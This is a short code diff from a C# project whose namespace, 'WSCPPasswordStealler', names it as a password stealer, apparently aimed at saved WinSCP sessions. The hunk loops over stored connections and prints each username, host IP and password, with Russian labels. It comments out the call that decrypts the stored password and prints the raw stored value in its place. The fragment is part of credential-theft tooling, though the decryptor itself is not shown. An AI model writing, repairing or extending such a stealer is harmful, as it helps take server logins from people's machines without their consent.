@@ -25,10 +25,10 @@ namespace WSCPPasswordStealler
             foreach(Connection c in connections)
             {
                 
-                byte[] pwd = Encoding.ASCII.GetBytes(c._password);
-                Decryptor dec = new Decryptor(pwd, c._username, c._host);
-                string res = dec.DecryptPassword();
-                Console.WriteLine($"Имя пользователя: {c._username} \n IP-адрес: {c._host} \n Пароль: {res} \n ");
+                //byte[] pwd = Encoding.ASCII.GetBytes(c._password);
+                //Decryptor dec = new Decryptor(pwd, c._username, c._host);
+                //string res = dec.DecryptPassword();
+                Console.WriteLine($"Имя пользователя: {c._username} \n IP-адрес: {c._host} \n Пароль: {c._password} \n ");
             }
 
         }
